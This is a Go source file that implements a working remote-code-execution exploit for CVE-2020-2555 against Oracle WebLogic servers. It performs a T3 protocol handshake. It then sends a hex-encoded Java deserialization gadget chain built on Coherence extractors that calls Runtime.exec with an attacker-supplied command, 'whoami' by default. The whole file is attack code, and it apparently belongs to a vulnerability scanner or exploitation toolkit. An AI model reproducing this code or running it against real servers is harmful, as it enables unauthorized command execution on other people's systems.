package cve_2020_2555Exp

import (
	"encoding/hex"
	"fmt"
	"net"
	"strconv"
	"time"
)

var (
	VUL = "CVE-2020-2555"
)

func t3handshake(conn net.Conn, server_addr string) {
	hex_data, _ := hex.DecodeString("74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a")
	_, err := conn.Write(hex_data)
	if err != nil {
		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
		return
	}
	time.Sleep(1 * time.Second)
	buf := make([]byte, 1024)
	conn.Read(buf)
}

func buildT3RequestObject(conn net.Conn, rport string) {
	data1, _ := hex.DecodeString("000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371")
	int_port, _ := strconv.Atoi(rport)
	//hex_port := fmt.Sprintf("%04x", intport)
	str_data2 := fmt.Sprintf("007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000%sffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07", fmt.Sprintf("%04x", int_port))
	data2, _ := hex.DecodeString(str_data2)
	data3, _ := hex.DecodeString("1a7727000d3234322e323134")
	data4, _ := hex.DecodeString("2e312e32353461863d1d0000000078")
	data_arr := [4][]byte{data1, data2, data3, data4}
	for _, data := range data_arr {
		conn.Write(data)
	}
	time.Sleep(2 * time.Second)
}

func sendEvilObjData(conn net.Conn, data string) []byte {
	payload := "056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000"
	payload += data
	payload += "fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff"
	//payload1 := '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload)
	payload1 := fmt.Sprintf("%08x%s", len(payload)/2+4, payload)
	payload2, _ := hex.DecodeString(payload1)
	conn.Write(payload2)
	var res []byte
	buf := make([]byte, 4096)
	count := 0
	for count < 5 {
		n, err := conn.Read(buf)
		if err != nil {
			break
		}
		res = append(res, buf[:n]...)
		time.Sleep(100 * time.Millisecond)
		count += 1
	}
	return res
}

//func run(rip string, rport string, index int) {
//
//}

func Run(rip string, rport string, cmd string) {
	server_addr := rip + ":" + rport

	conn, err := net.DialTimeout("tcp4", server_addr, 10*time.Second)
	if err != nil {
		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
		return
	}
	defer conn.Close()

	t3handshake(conn, server_addr)
	//hex_data, _ := hex.DecodeString("74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a")
	//_, err := conn.Write(hex_data)
	//if err != nil {
	//	fmt.Printf("[-]Target weblogic not detected %s", VUL[index])
	//	return
	//}
	//
	//time.Sleep(1 * time.Second)
	//buf := make([]byte, 1024)
	//conn.Read(buf)

	buildT3RequestObject(conn, rport)

	//data1, _ := hex.DecodeString("000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371")
	//int_port, _ := strconv.Atoi(rport)
	////hex_port := fmt.Sprintf("%04x", intport)
	//str_data2 := fmt.Sprintf("007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000%sffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07", fmt.Sprintf("%04x", int_port))
	//data2, _ := hex.DecodeString(str_data2)
	//data3, _ := hex.DecodeString("1a7727000d3234322e323134")
	//data4, _ := hex.DecodeString("2e312e32353461863d1d0000000078")
	//data_arr := [4][]byte{data1, data2, data3, data4}
	//for _, data := range data_arr {
	//	conn.Write(data)
	//}
	//time.Sleep(2 * time.Second)
	if cmd == "" {
		cmd = "whoami"
	}

	PAYLOAD := "aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000004374002079736f73657269616c2e7061796c6f6164732e4356455f323032305f323535357400124356455f323032305f323535352e6a6176617400096765744f626a6563747371007e000b0000000171007e000d71007e000e71007e000f7371007e000b0000002274001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e001a7873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c74657299022596d7b4595302000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e0001787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000047372002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4964656e74697479457874726163746f72936ee080c7259c4b0200007871007e0022000000007372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f6471007e00057871007e002200000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65707400096765744d6574686f647371007e0028000000007571007e002b000000027070740006696e766f6b657371007e0028000000007571007e002b0000000174"
	PAYLOAD += fmt.Sprintf("%04x", len(cmd))
	PAYLOAD += hex.EncodeToString([]byte(cmd))
	PAYLOAD += "7400046578656370767200116a6176612e6c616e672e52756e74696d650000000000000000000000787070"
	res := sendEvilObjData(conn, PAYLOAD)
	if res != nil {
		fmt.Printf("[+] The target weblogic has a JAVA deserialization vulnerability: %s\n", VUL)
	} else {
		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
	}

}
